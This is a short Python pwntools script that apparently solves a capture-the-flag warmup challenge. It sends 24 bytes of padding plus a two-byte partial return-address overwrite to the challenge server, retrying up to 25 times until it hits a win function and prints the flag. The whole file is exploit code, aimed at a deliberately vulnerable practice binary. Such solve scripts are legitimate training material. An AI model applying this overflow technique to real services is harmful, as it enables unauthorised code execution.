#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

context.binary = exe
context.log_level = "DEBUG"

# partial overwrite, win's last 3 significant nibbles are 219
padding = "a" * 24

def conn():
	if True:
		return remote("warmup1.ctf.maplebacon.org", 1337)
	else:
		return process([exe.path])

for i in range(25):
	test_payload = padding + "\x19\x02" # the 0 can be replaced with any hex char, should still get flag off of it
	r = conn()
	r.send(test_payload)
	res = r.recvall()
	print(res)
	r.close()
	if b'maple' in res:
		print(res)
		break
